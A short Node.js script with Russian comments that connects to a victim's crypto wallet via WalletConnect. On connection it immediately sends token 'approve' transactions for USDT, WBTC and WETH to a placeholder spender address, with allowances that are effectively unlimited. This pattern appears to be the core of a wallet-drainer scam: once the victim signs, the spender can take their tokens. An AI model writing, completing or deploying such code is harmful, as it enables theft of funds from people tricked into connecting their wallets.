const WalletConnect = require("@walletconnect/client").default;
const QRCode = require("qrcode");
const Web3 = require("web3");

// Инициализация WalletConnect
const connector = new WalletConnect({
  bridge: "https://bridge.walletconnect.org",
  clientMeta: {
    description: "WalletConnect Approve Script",
    url: "https://yourdomain.com",
    icons: ["https://walletconnect.org/walletconnect-logo.png"],
    name: "WalletConnect Approver"
  }
});

// Создание сессии и вывод QR-кода
if (!connector.connected) {
  connector.createSession().then(() => {
    QRCode.toString(connector.uri, { type: "terminal" }, (err, qr) => {
      if (err) return console.error("QR Error:", err);
      console.log(qr); // Выводим QR-код в консоль
    });
  });
}

// После подключения
connector.on("connect", async (error, payload) => {
  if (error) throw error;

  const { accounts } = payload.params[0];
  const address = accounts[0];
  console.log("Кошелёк подключён:", address);

  const web3 = new Web3("https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID");

  const spender = "0xYourSpenderAddress"; // <- Замени на нужный адрес

  const tokens = [
    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
    { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599" },
    { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" }
  ];

  const abi = [{
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" }
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  }];

  for (const token of tokens) {
    const contract = new web3.eth.Contract(abi, token.address);
    const data = contract.methods.approve(spender, web3.utils.toWei("1000", "ether")).encodeABI();

    const tx = {
      from: address,
      to: token.address,
      data: data
    };

    try {
      const result = await connector.sendTransaction(tx);
      console.log(`Approve для ${token.symbol} отправлен:`, result); // Лог успешного отправления транзакции
    } catch (e) {
      console.error(`Ошибка для ${token.symbol}:`, e.message); // Лог ошибки
    }
  }
});
